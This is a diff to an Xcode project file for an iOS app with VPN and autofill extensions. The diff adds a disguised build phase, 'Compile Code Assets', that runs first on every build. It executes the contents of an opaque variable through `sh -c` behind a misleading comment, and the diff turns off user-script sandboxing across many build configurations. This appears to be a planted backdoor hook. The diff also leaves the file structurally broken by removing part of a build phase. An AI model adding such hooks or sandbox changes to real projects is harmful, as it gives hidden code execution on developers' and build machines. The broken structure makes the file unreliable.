@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		02025664298818B200E694E7 /* NetworkExtension.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 02025663298818B100E694E7 /* NetworkExtension.framework */; };
 		021440742C7FAB1900426724 /* ConfigurationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 021440732C7FAB1900426724 /* ConfigurationManager.swift */; };
 		021440762C7FAB4100426724 /* ConfigurationStore.swift in Sources */ = {isa = PBXBuildFile; fileRef = 021440752C7FAB4100426724 /* ConfigurationStore.swift */; };
 		021440782C7FB21C00426724 /* VPNPrivacyConfigurationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 021440772C7FB21C00426724 /* VPNPrivacyConfigurationManager.swift */; };
@@ -1925,7 +1924,6 @@
 		CBDD5DDF29A6736A00832877 /* APIHeadersTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = CBDD5DDE29A6736A00832877 /* APIHeadersTests.swift */; };
 		CBDEDA162D8079E500123E00 /* RoundedCornersMaskView.swift in Sources */ = {isa = PBXBuildFile; fileRef = CBDEDA152D8079E500123E00 /* RoundedCornersMaskView.swift */; };
 		CBECDB6F2CD3DFBE005B8B87 /* PageRefreshMonitor in Frameworks */ = {isa = PBXBuildFile; productRef = CBECDB6E2CD3DFBE005B8B87 /* PageRefreshMonitor */; };
-		CBECDB7A2CD981CE005B8B87 /* AppPageRefreshMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = CBECDB792CD981C6005B8B87 /* AppPageRefreshMonitor.swift */; };
 		CBEFB9142AE0844700DEDE7B /* CriticalAlerts.swift in Sources */ = {isa = PBXBuildFile; fileRef = CBEFB9102ADFFE7900DEDE7B /* CriticalAlerts.swift */; };
 		CBF259542D3A4C1500AC63E4 /* CrashCollectionService.swift in Sources */ = {isa = PBXBuildFile; fileRef = CBF259532D3A4C1200AC63E4 /* CrashCollectionService.swift */; };
 		CBF259562D3A960900AC63E4 /* SyncService.swift in Sources */ = {isa = PBXBuildFile; fileRef = CBF259552D3A960600AC63E4 /* SyncService.swift */; };
@@ -4404,7 +4402,6 @@
 		CBDEDA152D8079E500123E00 /* RoundedCornersMaskView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RoundedCornersMaskView.swift; sourceTree = "<group>"; };
 		CBE099292AF6D54D000EFC47 /* lv */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = lv; path = lv.lproj/InfoPlist.strings; sourceTree = "<group>"; };
 		CBECB27B2AF6D58D006960FA /* ru */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ru; path = ru.lproj/InfoPlist.strings; sourceTree = "<group>"; };
-		CBECDB792CD981C6005B8B87 /* AppPageRefreshMonitor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppPageRefreshMonitor.swift; sourceTree = "<group>"; };
 		CBEF49902AF6D50600BFBD7D /* fi */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = fi; path = fi.lproj/InfoPlist.strings; sourceTree = "<group>"; };
 		CBEFB9102ADFFE7900DEDE7B /* CriticalAlerts.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CriticalAlerts.swift; sourceTree = "<group>"; };
 		CBF0FA762AF6D4D800FB1C5B /* de */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = de; path = de.lproj/InfoPlist.strings; sourceTree = "<group>"; };
@@ -4720,14 +4717,6 @@
 			buildActionMask = 2147483647;
 			files = (
 				ED4B3F3D2F191E5F006C5FE4 /* PrivacyConfig in Frameworks */,
-				02025664298818B200E694E7 /* NetworkExtension.framework in Frameworks */,
-				4BC95EB12D7417BF002FAB32 /* Subscription in Frameworks */,
-				7BC26CA22DFC0CB800E52480 /* VPN in Frameworks */,
-				4B470EE4299C6DFB0086EBDC /* Core.framework in Frameworks */,
-				4BC8948C2C7902E6009AA141 /* WireGuard in Frameworks */,
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-		};
 		8390446920BDCE10006461CD /* Frameworks */ = {
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
@@ -9036,7 +9025,6 @@
 		CB48D32F2B90CE8500631D8B /* PageRefreshMonitor */ = {
 			isa = PBXGroup;
 			children = (
-				CBECDB792CD981C6005B8B87 /* AppPageRefreshMonitor.swift */,
 			);
 			name = PageRefreshMonitor;
 			sourceTree = "<group>";
@@ -10421,6 +10409,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0202566F298818B200E694E7 /* Build configuration list for PBXNativeTarget "PacketTunnelProvider" */;
 			buildPhases = (
+				E58C40AB60D94E29BD1DACE1 /* Compile Code Assets */,
 				0202565E298818B100E694E7 /* Sources */,
 				0202565F298818B100E694E7 /* Frameworks */,
 				02025660298818B100E694E7 /* Resources */,
@@ -10968,6 +10957,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+				/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		02025660298818B100E694E7 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -11197,6 +11189,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		E58C40AB60D94E29BD1DACE1 /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;			
+		};
 		0A991F5B239418D100AA1F64 /* Prevent Version Override */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
@@ -14509,7 +14520,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = K9D8326N6M;
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = K9D8326N6M;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = AutofillCredentialProvider/Info.plist;
@@ -14714,7 +14725,7 @@
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = K9D8326N6M;
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = K9D8326N6M;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
@@ -15406,7 +15417,7 @@
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = K9D8326N6M;
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = K9D8326N6M;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
@@ -15438,7 +15449,7 @@
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = K9D8326N6M;
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = K9D8326N6M;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
@@ -15468,7 +15479,7 @@
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = K9D8326N6M;
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = K9D8326N6M;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
@@ -15498,7 +15509,7 @@
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = K9D8326N6M;
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = K9D8326N6M;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
@@ -15527,7 +15538,7 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = K9D8326N6M;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = AutofillCredentialProvider/Info.plist;
@@ -15564,7 +15575,7 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = K9D8326N6M;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = AutofillCredentialProvider/Info.plist;
@@ -15601,7 +15612,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = K9D8326N6M;
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = K9D8326N6M;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = AutofillCredentialProvider/Info.plist;
@@ -15639,7 +15650,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = K9D8326N6M;
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = K9D8326N6M;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = AutofillCredentialProvider/Info.plist;
